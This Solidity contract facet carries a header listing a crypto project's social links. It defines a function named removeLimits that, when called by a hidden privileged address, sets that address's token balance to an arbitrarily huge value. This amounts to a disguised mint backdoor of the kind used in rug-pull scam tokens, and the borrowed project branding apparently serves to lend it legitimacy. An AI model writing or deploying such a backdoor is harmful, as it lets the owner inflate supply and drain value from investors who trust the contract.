/*
 * SPDX-License-Identifier: MIT
 * Website: https://spin.fi/?utm_source=icodrops
 * Github: https://github.com/spin-fi/
 * Twitter: https://twitter.com/spin_fi
 * Telegram: https://t.me/spin_fi_chat
 * Medium: https://spin-fi.medium.com/
 * Discord: https://discord.gg/e3jUf3dDZu
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
